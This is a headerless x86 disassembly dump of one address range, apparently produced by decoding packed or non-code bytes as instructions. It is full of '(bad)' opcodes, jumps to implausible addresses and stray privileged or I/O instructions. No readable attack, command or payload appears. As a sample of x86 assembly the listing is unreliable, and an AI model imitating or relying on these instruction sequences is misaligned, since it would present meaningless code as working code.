  41863d:	lea    edi,[edi+eax*2]
  418640:	mov    al,0x1
  418642:	jb     0x418644
  418644:	mov    al,0x10
  418646:	push   eax
  418647:	add    al,0x75
  418649:	add    BYTE PTR [ebx],ch
  41864b:	add    ebx,esp
  41864d:	int3   
  41864e:	jne    0x418660
  418650:	movsx  edx,cl
  418653:	add    DWORD PTR [eax],eax
  418655:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  41865c:	mov    gs,edi
  41865e:	add    BYTE PTR [eax-0x50],ch
  418661:	add    al,ch
  418663:	mov    eax,DWORD PTR [ecx]
  418665:	sub    eax,DWORD PTR [eax]
  418667:	jb     0x4186de
  418669:	add    DWORD PTR [esp+eiz*8-0x50],esi
  41866d:	jge    0x418657
  41866f:	add    al,0x1
  418671:	add    DWORD PTR [eax],0x0
  418674:	jne    0x418676
  418676:	je     0x4186bd
  418678:	mov    eax,DWORD PTR [edi]
  41867a:	ror    BYTE PTR [ebp+0x4d],1
  41867d:	or     DWORD PTR [ecx+0x4d03d004],0x3
  418684:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  41868a:	mov    DWORD PTR [ebx],ebp
  41868c:	fadd   DWORD PTR [eax+0x75]
  41868f:	inc    eax
  418690:	pop    eax
  418691:	lea    ebx,[ecx+0x4f]
  418694:	push   0xb1000003
  418699:	out    dx,eax
  41869a:	add    ebp,DWORD PTR [edx+edx*2]
  41869d:	add    BYTE PTR [ebx+ecx*4],bh
  4186a0:	mov    ch,BYTE PTR [ebx]
  4186a2:	jb     0x418716
  4186a4:	add    al,0x89
  4186a6:	push   eax
  4186a7:	call   0x8429d419
  4186ac:	add    DWORD PTR [eax+eax*1],eax
  4186af:	jae    0x4186c5
  4186b1:	icebp  
  4186b2:	inc    ebp
  4186b3:	mov    eax,DWORD PTR gs:[ecx]
  4186b6:	int3   
  4186b7:	out    dx,al
  4186b8:	loopne 0x418707
  4186ba:	sub    eax,DWORD PTR [edx]
  4186bc:	push   0xffffff83
  4186be:	pop    esi
  4186bf:	push   cs
  4186c0:	jl     0x4186db
  4186c2:	add    al,0xaf
  4186c4:	xor    eax,0x832b6d00
  4186c9:	mov    eax,DWORD PTR [edx]
  4186cb:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4186d1:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4186d7:	inc    ebp
  4186d8:	shr    ebx,0x3
  4186db:	or     DWORD PTR [eax],0x4
  4186de:	push   0xffffffa5
  4186e0:	pop    esi
  4186e1:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4186e8:	jmp    0x418747
  4186ea:	mov    edi,0xff0272
  4186ef:	fdivr  QWORD PTR [ebp+0x5d]
  4186f2:	push   0x4e
  4186f4:	pop    ecx
  4186f5:	call   0x41cafa
  4186fa:	mov    DWORD PTR [ebx],eax
  4186fc:	in     al,0xc8
  4186fe:	rol    BYTE PTR [ebp-0x75],0xc1
  418702:	call   0xab88e3
  418707:	pop    esi
  418708:	enter  0xceff,0x8b
  41870c:	repz mov ecx,DWORD PTR [ebp-0x34]
  418710:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  418717:	je     0x418719
  418719:	or     DWORD PTR [ebx-0x74183b24],eax
  41871f:	jne    0x418705
  418721:	jmp    0x41871c
  418723:	push   DWORD PTR [edx-0x24]
  418726:	push   0x4d
  418728:	pop    ecx
  418729:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  41872d:	jge    0x418735
  41872f:	mov    eax,eax
  418731:	sub    ebp,DWORD PTR [edx+0x24]
  418734:	pop    esi
  418735:	inc    ebp
  418736:	mov    esp,0x8b6077
  41873b:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  418741:	lods   al,BYTE PTR ds:[esi]
  418742:	add    BYTE PTR [ebx],bh
  418744:	enter  0xce73,0x49
  418748:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  418750:	stc    
  418751:	jge    0x4187c5
  418753:	jnp    0xdd410ab4
  418759:	call   0xc4882f
  41875e:	fadd   st(0),st
  418760:	dec    esi
  418761:	ins    BYTE PTR es:[edi],dx
  418762:	stc    
  418763:	cmp    al,0x73
  418765:	push   ebp
  418766:	mov    eax,0xf8028b
  41876b:	jne    0x41872e
  41876d:	mov    esi,ecx
  41876f:	mov    esp,DWORD PTR [ebp+0x2c]
  418772:	add    edi,DWORD PTR [ebp-0x24]
  418775:	sub    esp,eax
  418777:	and    al,0x45
  418779:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  41877f:	sbb    al,0xee
  418781:	pop    esi
  418782:	call   0x8187b2
  418787:	fsubr  st,st(3)
  418789:	sti    
  41878a:	add    BYTE PTR gs:[ecx],bh
  41878d:	add    eax,esp
  41878f:	add    DWORD PTR [esi],eax
  418791:	rol    DWORD PTR [ebp+0x8],0x29
  418795:	mov    esp,eax
  418797:	clc    
  418798:	jne    0x41880f
  41879a:	mov    eax,0x8b0673
  41879f:	loopne 0x4187e6
  4187a1:	loopne 0x41872c
  4187a3:	lods   al,BYTE PTR ds:[esi]
  4187a4:	int3   
  4187a5:	inc    ebp
  4187a6:	mov    DWORD PTR gs:[eax+edi*8],eax
  4187aa:	add    al,0xc3
  4187ac:	sub    ecx,DWORD PTR [ebp+0x47]
  4187af:	(bad)  
  4187b1:	shr    BYTE PTR [ebp-0x1f],0xe8
  4187b5:	add    eax,DWORD PTR [eax]
  4187b7:	call   0x64348bc
  4187bc:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4187c2:	dec    esi
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	in     al,dx
  4187c5:	lea    eax,[eax]
  4187c7:	inc    ebp
  4187c8:	inc    ebp
  4187c9:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4187cf:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4187d9:	and    al,0xdc
  4187db:	ror    DWORD PTR [edx+0x24],0xf7
  4187df:	or     BYTE PTR [ebp+0x4c],dh
  4187e2:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4187e6:	stos   BYTE PTR es:[edi],al
  4187e7:	adc    edx,edi
  4187e9:	inc    esp
  4187ea:	add    edi,DWORD PTR [eax]
  4187ec:	jne    0x4187d1
  4187ee:	mov    DWORD PTR [eax-0x7449db04],ecx
  4187f4:	cmp    ecx,DWORD PTR [edi]
  4187f6:	sub    BYTE PTR [ebp-0x7e],dl
  4187f9:	sar    ebp,0xb
  4187fc:	jmp    FWORD PTR [edi+0x2400392a]
  418802:	sub    esi,DWORD PTR [ebx-0x73]
  418805:	mov    esp,DWORD PTR [ecx+edi*4]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	and    BYTE PTR [eax],al
  41880c:	jne    0x4187d8
  41880e:	sub    ebp,ecx
  418810:	sbb    BYTE PTR [esi+0x32],ah
  418813:	dec    ebp
  418814:	push   ebp
  418815:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41881b:	ret    
  41881c:	mov    edx,ebp
  41881e:	leave  
  41881f:	sub    DWORD PTR [esi+0x24],ebx
  418822:	ret    0x2b
  418825:	pop    ax
  418827:	push   ebp
  418828:	rol    BYTE PTR [ebx],0xeb
  41882b:	add    DWORD PTR [ecx+0x6c0001],0x40
  418832:	jb     0x418889
  418834:	ret    
  418835:	in     al,dx
  418836:	jecxz  0x4187c3
  418838:	push   esi
  418839:	xchg   esp,eax
  41883a:	jne    0x41883c
  41883c:	cmp    edx,DWORD PTR [esi+0x1c]
  41883f:	jne    0x418825
  418841:	mov    eax,DWORD PTR [ebp-0x77]
  418844:	ror    DWORD PTR [ebx+0x899408],0xe0
  41884b:	mov    esi,DWORD PTR [ebp-0x75]
  41884e:	pop    esi
  41884f:	nop
  418850:	mov    eax,DWORD PTR [eax]
  418852:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  418858:	add    al,0x0
  41885a:	inc    ebp
  41885b:	mov    eax,DWORD PTR [ebx]
  41885d:	mov    ebp,ebx
  41885f:	cmp    al,0xf
  418861:	or     al,al
  418863:	inc    ebp
  418864:	inc    ebp
  418865:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41886b:	cld    
  41886c:	add    BYTE PTR [edi+0x556c16c0],dh
  418872:	add    BYTE PTR [ecx-0x5],dl
  418875:	add    eax,0x17200
  41887a:	sbb    al,0x85
  41887c:	dec    esp
  41887d:	je     0x4188b7
  41887f:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  418883:	add    BYTE PTR [ebx],bh
  418885:	(bad)  
  418886:	and    al,0x30
  418888:	jae    0x418826
  41888a:	mov    cl,cl
  41888c:	inc    DWORD PTR [esp]
  41888f:	push   ebp
  418890:	shr    esp,0x8
  418893:	in     al,dx
  418894:	push   esp
  418895:	add    DWORD PTR [eax],esp
  418897:	add    bl,cl
  418899:	inc    ebp
  41889a:	mov    bh,0x53
  41889c:	add    BYTE PTR [ebp-0x17],al
  41889f:	push   esi
  4188a0:	cmovne ecx,edx
  4188a3:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4188a7:	push   edi
  4188a8:	pop    ss
  4188a9:	xor    ecx,ebx
  4188ab:	pushf  
  4188ac:	add    BYTE PTR [ecx+0x452bf800],cl
  4188b2:	rcr    ecx,0x5
  4188b5:	inc    ebp
  4188b6:	add    esp,ebx
  4188b8:	add    BYTE PTR [ebp-0x40],al
  4188bb:	out    0x6c,eax
  4188bd:	inc    ebp
  4188be:	inc    eax
  4188bf:	sub    eax,0x450547c1
  4188c4:	dec    esp
  4188c5:	and    BYTE PTR cs:[ebp-0x27],al
  4188c9:	jo     0x4188f4
  4188cb:	leave  
  4188cc:	add    BYTE PTR [esi+0xc000c0],bh
  4188d2:	lea    eax,[esp-0x40]
  4188d6:	ret    
  4188d7:	mov    dh,0x8b
  4188d9:	xor    edx,DWORD PTR [ecx+0x3]
  4188dc:	mov    al,BYTE PTR [ecx+0x1]
  4188df:	sbb    BYTE PTR [eax],al
  4188e1:	stc    
  4188e2:	mov    esi,DWORD PTR [edx+0x8]
  4188e5:	(bad)  
  4188e6:	ss mov eax,0xb98ac631
  4188ec:	add    esi,eax
  4188ee:	add    BYTE PTR [edx-0x444d39f7],bh
  4188f4:	add    esi,eax
  4188f6:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  4188fd:	mov    BYTE PTR [eax],0xbe
  418900:	or     BYTE PTR [ebx],dh
  418902:	dec    ecx
  418903:	lea    eax,[ebx]
  418905:	or     eax,0x18fc0fc7
  41890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890b:	(bad)  
  41890d:	fiadd  WORD PTR [ebp-0x78]
  418910:	jae    0xed76905f
  418916:	or     BYTE PTR [ebp+0x7],al
  418919:	in     eax,dx
  41891a:	pushf  
  41891b:	inc    ebp
  41891c:	xor    bl,al
  41891e:	pop    esi
  41891f:	inc    ebp
  418920:	shl    esp,0xc
  418923:	inc    ebp
  418924:	sub    cl,0x1
  418927:	inc    ebp
  418928:	add    bh,bl
  41892a:	add    BYTE PTR [ebp-0x7b],al
  41892d:	loopne 0x418927
  41892f:	inc    ebp
  418930:	ret    0xe7
  418933:	inc    ebp
  418934:	mov    esi,DWORD PTR [eax-0x7f]
  418937:	leave  
  418938:	and    al,0x44
  41893a:	add    BYTE PTR [eax+0x331cb68b],dh
  418940:	mov    DWORD PTR [ebx],eax
  418942:	sbb    al,0x41
  418944:	(bad)  
  418945:	sbb    al,ah
  418947:	stc    
  418948:	test   DWORD PTR [edx-0x8],esi
  41894b:	lea    edi,[edi-0x7007a98]
  418951:	mov    DWORD PTR [ebp-0x2c],edi
  418954:	(bad)  
  418955:	dec    ebp
  418956:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  41895d:	add    edx,eax
  41895f:	(bad)  
  418960:	(bad)  
  418961:	inc    ebx
  418963:	jmp    FWORD PTR [edx-0x38]
  418966:	(bad)  
  418967:	or     al,ah
  418969:	jge    0x418931
  41896b:	mov    ebp,0x5a8533e4
  418971:	clc    
  418972:	leave  
  418973:	inc    ebp
  418974:	add    BYTE PTR [ebx+0xd8c8d],cl
  41897a:	rdpmc  
  41897c:	sbb    BYTE PTR [edi+0x7de08da],bh
  418982:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  418989:	cmovne edx,ebx
  41898c:	jmp    0x41898e
  41898e:	inc    ebp
  41898f:	mov    ebp,ebp
  418991:	sbb    al,0x45
  418993:	mov    ebx,ebx
  418995:	add    DWORD PTR [ebp+0x0],eax
  418998:	out    dx,al
  418999:	add    DWORD PTR [ebp+0x4d],eax
  41899c:	sub    eax,0x2e80458b
  4189a1:	add    BYTE PTR [ebp-0x77],al
  4189a4:	jo     0x418a10
  4189a6:	leave  
  4189a7:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4189af:	inc    ebp
  4189b0:	add    ebx,edi
  4189b2:	inc    ecx
  4189b3:	out    0x18,eax
  4189b5:	(bad)  
  4189b6:	stc    
  4189b7:	int3   
  4189b8:	jb     0x418944
  4189ba:	(bad)  
  4189bb:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4189c1:	or     dh,al
  4189c3:	dec    esi
  4189c4:	mov    dl,0xf3
  4189c6:	mov    BYTE PTR [ebp-0x4d],0x89
  4189ca:	(bad)  
  4189cb:	loopne 0x418981
  4189cd:	inc    esi
  4189cf:	lea    esi,[ebp-0x49003924]
  4189d5:	push   eax
  4189d6:	mov    BYTE PTR [ebp-0x49],0x33
  4189da:	xor    eax,DWORD PTR [ebx]
  4189dc:	lea    edx,[eax+0xd]
  4189df:	inc    ebp
  4189e0:	jae    0x8c1beffe
  4189e6:	ficomp WORD PTR [eax+ecx*4]
  4189e9:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  4189f0:	test   esi,edi
  4189f2:	(bad)  
  4189f3:	(bad)  
  4189f4:	inc    DWORD PTR [eax]
  4189f6:	inc    ebp
  4189f7:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  4189fd:	test   DWORD PTR [ebx],edx
  4189ff:	jne    0x41898a
  418a01:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  418a0b:	jmp    0x1258a99
  418a10:	inc    ebp
  418a11:	jne    0x4189f5
  418a13:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  418a1a:	mov    BYTE PTR [ebp+0x45009c01],cl
  418a20:	shl    BYTE PTR [eax],0x55
  418a23:	push   cx
  418a25:	mov    bx,0x7245
  418a29:	gs add bh,al
  418a2c:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  418a33:	inc    ebp
  418a34:	dec    ebp
  418a35:	into   
  418a36:	mov    esp,ebx
  418a38:	jl     0x418a01
  418a3a:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  418a41:	inc    ebp
  418a42:	mov    edi,ebx
  418a44:	add    ebp,esp
  418a46:	add    BYTE PTR [esi+0x1],ah
  418a49:	inc    ebp
  418a4a:	or     BYTE PTR [edi],bh
  418a4c:	inc    ebp
  418a4d:	(bad)  
  418a4e:	in     eax,dx
  418a4f:	fsubr  st(4),st
  418a51:	inc    edi
  418a53:	add    dl,al
  418a55:	add    al,ah
  418a57:	call   0x86a2cc
  418a5c:	pop    esi
  418a5d:	test   DWORD PTR [eax],ecx
  418a5f:	dec    dl
  418a61:	(bad)  
  418a62:	jmp    0x414012ec
  418a67:	push   DWORD PTR [ebp-0x75]
  418a6a:	(bad)  
  418a6b:	loopne 0x418a39
  418a6d:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  418a77:	push   eax
  418a78:	inc    DWORD PTR [ebp-0x75]
  418a7b:	mov    esp,eax
  418a7d:	cwde   
  418a7e:	mov    DWORD PTR [eax],0xff8bffc3
  418a84:	sbb    al,0x8
  418a86:	ror    BYTE PTR [ebp+0x50],0x51
  418a8a:	inc    ebp
  418a8b:	ror    BYTE PTR [ebx+0x65987d],1
  418a91:	test   edi,eax
  418a93:	add    al,0xdc
  418a95:	add    bh,bh
  418a97:	push   0x1
  418a99:	add    BYTE PTR [eax],al
  418a9b:	mov    edi,edi
  418a9d:	inc    WORD PTR [ebp+0x8]
  418aa1:	add    eax,0xd
  418aa4:	(bad)  
  418aa6:	xor    eax,0x782ec89
  418aab:	push   ecx
  418aac:	cli    
  418aad:	popw   es
  418aaf:	push   ebp
  418ab0:	xchg   BYTE PTR [ebx-0x76740800],al
  418ab6:	sbb    al,0x86
  418ab8:	test   DWORD PTR [ecx-0x2],edx
  418abb:	call   WORD PTR [ebp-0x40]
  418abf:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  418ac3:	mov    eax,ebx
  418ac5:	mov    dh,BYTE PTR ds:0xc7666851
  418acb:	push   ebp
  418acc:	fsub   QWORD PTR [esi+0x0]
  418acf:	dec    ebp
  418ad0:	inc    ebp
  418ad1:	mov    edx,0xec4ec0
  418ad6:	(bad)  
  418ad7:	retf   0x89a0
  418ada:	fist   DWORD PTR [eax+0x454ae1]
  418ae0:	jmp    0xa8b5:0xc7663e8b
  418ae7:	jmp    edx
  418ae9:	(bad)  
  418aea:	in     eax,dx
  418aeb:	lock (bad) 
  418aed:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  418af4:	(bad)  
  418af5:	xor    eax,0x700089ff
  418afa:	add    bh,bh
  418afc:	stos   DWORD PTR es:[edi],eax
  418afd:	data16 add BYTE PTR [ebp-0x1b0077],al
  418b04:	inc    DWORD PTR [ecx-0x73]
  418b07:	data16 fadd QWORD PTR [ebp-0xaf0001]
  418b0e:	inc    ebp
  418b0f:	shl    BYTE PTR [ebx],0x66
  418b12:	add    eax,DWORD PTR [ebp-0xba00b0]
  418b18:	add    DWORD PTR [ecx+0x44],0x66
  418b1c:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  418b22:	add    DWORD PTR [ecx-0xcf8600],ecx
  418b28:	push   ebp
  418b29:	lea    dx,[ebp-0x28]
  418b30:	add    BYTE PTR [ebp-0x25],0xf
  418b34:	jge    0xff428a3b
  418b3a:	mov    ecx,0xc34fc7
  418b3f:	rol    ecx,0x89
  418b42:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  418b46:	ror    BYTE PTR [ebx-0x48990775],0x55
  418b4d:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  418b54:	test   BYTE PTR [ecx-0x3f997f3e],cl
  418b5a:	push   ebp
  418b5b:	mov    DWORD PTR [ebp-0x76761480],ecx
  418b61:	or     BYTE PTR [eax+0x6600c265],0x45
  418b68:	push   ebp
  418b69:	xor    DWORD PTR [ebp-0x76381e64],ecx
  418b6f:	aam    0x8c
  418b71:	test   DWORD PTR [ecx-0x3dba7108],ecx
  418b77:	cmp    eax,0xc78b9c00
  418b7c:	data16 hlt 
  418b7e:	dec    ebp
  418b7f:	test   DWORD PTR [ecx+0x454ff8],edi
  418b85:	xor    ecx,esi
  418b87:	lahf   
  418b88:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  418b8e:	mov    eax,DWORD PTR [ecx]
  418b90:	data16 add BYTE PTR [ebp-0x7400bb],dh
  418b97:	sbb    al,0x71
  418b99:	dec    ebp
  418b9a:	mov    si,WORD PTR [ebp-0xff0074]
  418ba1:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  418ba7:	add    BYTE PTR [ebp-0x760fd477],cl
  418bad:	jne    0x418c23
  418baf:	test   edi,edi
  418bb1:	jne    0x418b36
  418bb3:	(bad)  
  418bb4:	sti    
  418bb5:	sbb    BYTE PTR [ecx-0x1789ab],cl
  418bbb:	cld    
  418bbc:	(bad)  
  418bbd:	jmp    DWORD PTR [ecx]
  418bbf:	inc    ebp
  418bc0:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  418bc6:	data16 cmp al,0x8d
  418bc9:	push   cs
  418bca:	inc    DWORD PTR [ebp-0x1]
  418bcd:	test   DWORD PTR [ecx-0x838c],ecx
  418bd3:	sbb    al,0x8b
  418bd5:	lock clc 
  418bd7:	push   DWORD PTR [edi-0xe39375]
  418bdd:	xor    BYTE PTR [ebx],0x1
  418be0:	add    eax,DWORD PTR [eax]
  418be2:	xor    eax,DWORD PTR [eax]
  418be4:	mov    WORD PTR [ebp-0xba003d],0x4575
  418bed:	mov    ecx,DWORD PTR [edi]
  418bef:	sbb    al,0x4d
  418bf1:	mov    DWORD PTR [ebx],esi
  418bf3:	add    DWORD PTR [ebx],eax
  418bf5:	add    BYTE PTR [ebx],dh
  418bf7:	xor    DWORD PTR [esi-0x80],esp
  418bfa:	inc    ebp
  418bfb:	add    DWORD PTR [ebx],esi
  418bfd:	add    BYTE PTR [esi+0x50],ah
  418c00:	inc    ebp
  418c01:	jmp    0x868e6c
  418c06:	add    DWORD PTR [eax+0xc70194],0xffffffec
  418c0d:	or     BYTE PTR [ebp+0x4501f845],dh
  418c13:	jmp    0xdd8f09
  418c18:	(bad)  
  418c19:	push   cs
  418c1a:	in     al,0xc9
  418c1c:	test   DWORD PTR [ebp+0x4502f8],eax
  418c22:	xor    ecx,DWORD PTR [ebp-0x64]
  418c25:	mov    eax,edi
  418c27:	mov    esp,esp
  418c29:	push   eax
  418c2a:	add    eax,0x45fff885
  418c2f:	dec    DWORD PTR [ebx+0x339445]
  418c35:	add    ecx,DWORD PTR [ecx+0x452ce889]
  418c3b:	dec    DWORD PTR [ebx-0x4e0be375]
  418c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c42:	add    edi,edi
  418c44:	add    bh,bh
  418c46:	push   cs
  418c47:	xor    eax,DWORD PTR [eax+0x890103]
  418c4d:	xor    BYTE PTR [ebp-0x1],al
  418c50:	mov    DWORD PTR [ebp-0x36df38],ecx
  418c56:	push   cs
  418c57:	push   eax
  418c58:	jne    0x418c9f
  418c5a:	mov    esi,DWORD PTR [ebx]
  418c5c:	sbb    al,0x3
  418c5e:	jne    0x418cb0
  418c60:	inc    DWORD PTR [ebp-0x75]
  418c63:	add    eax,0x800f0
  418c68:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  418c6e:	mov    DWORD PTR [ecx],eax
  418c70:	sbb    BYTE PTR [eax],al
  418c72:	leave  
  418c73:	test   DWORD PTR [edi-0x1],eax
  418c76:	jne    0x418c77
  418c78:	call   0xff42777d
  418c7d:	xor    BYTE PTR [ebp+0x4d],al
  418c80:	mov    edi,edi
  418c82:	enter  0x8,0x4d
  418c86:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  418c8c:	mov    eax,DWORD PTR [eax]
  418c8e:	sbb    al,0x1
  418c90:	sbb    DWORD PTR [ebp+0x4d],eax
  418c93:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  418c99:	inc    eax
  418c9a:	dec    DWORD PTR [ecx-0x27d775]
  418ca0:	add    BYTE PTR [ebx-0x38d72b01],cl
  418ca6:	xchg   ecx,eax
  418ca7:	ret    
  418ca8:	add    BYTE PTR [ebp-0x830075],al
  418cae:	add    BYTE PTR [ebp-0x75],al
  418cb1:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  418cb7:	lea    edi,[edi+0x20]
  418cba:	add    bh,bh
  418cbc:	mov    edx,DWORD PTR [eax-0x7b]
  418cbf:	inc    ebp
  418cc0:	rdpmc  
  418cc2:	jne    0x418cc7
  418cc4:	add    BYTE PTR [eax-0x75],dl
  418cc7:	inc    ebp
  418cc8:	call   0x404195d2
  418ccd:	add    BYTE PTR [ecx-0xe3d775],cl
  418cd3:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  418cda:	ret    
  418cdb:	inc    DWORD PTR [ebp-0xff0001]
  418ce1:	add    BYTE PTR [ebp-0x4b],al
  418ce4:	cmp    edi,0x24
  418ce7:	(bad)  
  418ce8:	push   DWORD PTR [eax]
  418cea:	add    BYTE PTR [ebp-0x39],dl
  418ced:	test   ebx,eax
  418cef:	je     0x418c76
  418cf1:	mov    edi,edi
  418cf3:	sbb    bh,bh
  418cf5:	test   DWORD PTR gs:[eax],eax
  418cf8:	(bad)  
  418cf9:	js     0x418cfa
  418cfb:	add    BYTE PTR [ebx-0x38b21fdd],cl
  418d01:	sub    eax,ebx
  418d03:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  418d09:	add    eax,DWORD PTR [eax]
  418d0b:	dec    ebp
  418d0c:	push   eax
  418d0d:	mov    al,BYTE PTR [ebp+0x1]
  418d10:	mov    eax,DWORD PTR [ebp-0x68]
  418d13:	mov    eax,DWORD PTR [eax]
  418d15:	cld    
  418d16:	(bad)  
  418d17:	or     BYTE PTR [eax],ah
  418d19:	dec    ebp
  418d1a:	inc    DWORD PTR [eax+0x4]
  418d1d:	push   ecx
  418d1e:	add    BYTE PTR [edx-0x1],dh
  418d21:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  418d27:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  418d31:	add    ecx,DWORD PTR [ecx-0xf037477]
  418d37:	push   ecx
  418d38:	xor    BYTE PTR [ebx],al
  418d3a:	inc    ebp
  418d3b:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  418d41:	(bad)  
  418d42:	push   eax
  418d44:	inc    DWORD PTR [eax]
  418d46:	inc    ebp
  418d47:	add    BYTE PTR [ebx],dh
  418d49:	add    BYTE PTR [ebx],0x0
  418d4c:	mov    DWORD PTR [ebx-0x150007d4],eax
  418d52:	lea    edx,[ebp-0x6c]
  418d55:	je     0x418cdc
  418d57:	(bad)  
  418d58:	dec    DWORD PTR [eax]
  418d5a:	call   DWORD PTR [ebp-0x7b]
  418d5d:	mov    edi,edi
  418d5f:	hlt    
  418d60:	call   DWORD PTR [ebp-0x75]
  418d63:	mov    esp,eax
  418d65:	cwde   
  418d66:	(bad)  
  418d67:	mov    bh,0xc3
  418d69:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  418d6f:	add    DWORD PTR [eax],0x450050ff
  418d75:	mov    DWORD PTR [ebx+0x9598c8],ecx
  418d7b:	inc    edi
  418d7d:	jmp    DWORD PTR [eax]
  418d7f:	jmp    0xcd00:0x640481ff
  418d86:	mov    DWORD PTR [ebx],esi
  418d88:	and    al,0x81
  418d8a:	push   DWORD PTR [edx]
  418d8c:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  418d93:	add    esi,DWORD PTR [eax]
  418d95:	enter  0x3c45,0x83
  418d99:	add    ah,bh
  418d9b:	adc    DWORD PTR [ebx+0x768b5055],eax
  418da1:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  418da7:	mov    esi,eax
  418da9:	xor    BYTE PTR [ebp+0x45],cl
  418dac:	jmp    0x418d39
  418dae:	mov    ebx,DWORD PTR [eax]
  418db0:	in     al,dx
  418db1:	inc    ebp
  418db2:	or     al,0x2
  418db4:	dec    DWORD PTR [ebp-0x4]
  418db7:	jne    0x418e0e
  418db9:	mov    ecx,DWORD PTR [eax+0x18558be8]
  418dbf:	mov    edi,DWORD PTR [ebx]
  418dc1:	lock push eax
  418dc3:	xchg   ecx,eax
  418dc4:	jmp    0x341dbc9
  418dc9:	adc    al,0x8b
  418dcb:	inc    ebp
  418dcc:	mov    al,ds:0x8b04008b
  418dd1:	push   ebp
  418dd2:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  418dd8:	push   ebp
  418dd9:	test   DWORD PTR [ebx-0x2900d701],ecx
  418ddf:	inc    ebp
  418de0:	dec    ebp
  418de1:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  418de7:	mov    DWORD PTR [eax],0xe9ff0020
  418ded:	add    al,0x0
  418def:	add    BYTE PTR [eax],al
  418df1:	mov    eax,edx
  418df3:	push   eax
  418df4:	rol    DWORD PTR [ebp-0xb0077],1
  418dfa:	bound  eax,QWORD PTR [ebp+0x50]
  418dfd:	xor    ecx,DWORD PTR [ecx+0x55899803]
  418e03:	sub    al,0x89
  418e05:	push   esp
  418e07:	lea    edx,[ebp-0x6c]
  418e0a:	jne    0xffd78d22
  418e10:	inc    DWORD PTR [ebp-0x1d0001]
  418e16:	jnp    0xc7976e1c
  418e1c:	mov    eax,ebx
  418e1e:	fs mov edi,edi
  418e21:	sbb    al,0xc1
  418e23:	out    dx,al
  418e24:	or     al,0x0
  418e26:	ret    0x8d50
  418e29:	inc    ebp
  418e2a:	dec    DWORD PTR [ebx+0xfa98d7]
  418e30:	test   edi,edi
  418e32:	clc    
  418e33:	call   FWORD PTR [edi]
  418e35:	or     BYTE PTR [eax],cl
  418e37:	inc    ebp
  418e38:	dec    ebp
  418e39:	inc    DWORD PTR [ebx+0x74803114]
  418e3f:	add    DWORD PTR [ebx+0x45fc00],ecx
  418e45:	call   DWORD PTR [eax+edx*1]
  418e48:	add    ecx,DWORD PTR [ebp-0x38]
  418e4b:	push   esi
  418e4c:	adc    al,0x8
  418e4e:	mov    edx,DWORD PTR [ebp-0x14]
  418e51:	mov    ecx,DWORD PTR [ebp-0x4]
  418e54:	add    DWORD PTR [ebp-0x68],0xffffff8d
  418e58:	inc    DWORD PTR [esp+esi*8]
  418e5b:	inc    ebp
  418e5c:	stos   BYTE PTR es:[edi],al
  418e5d:	mov    edx,DWORD PTR [ebp+0x1c]
  418e60:	add    DWORD PTR [ebp-0x10],eax
  418e63:	mov    edx,DWORD PTR [ebp-0x70]
  418e66:	cmp    eax,DWORD PTR [eax]
  418e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e69:	mov    eax,DWORD PTR [eax]
  418e6b:	sbb    al,0x73
  418e6d:	add    BYTE PTR [ebx],0x1
  418e70:	call   0x8971de75
  418e75:	xor    eax,ebp
  418e77:	pop    ds
  418e78:	inc    ebp
  418e79:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  418e7f:	(bad)  
  418e80:	push   DWORD PTR [edi]
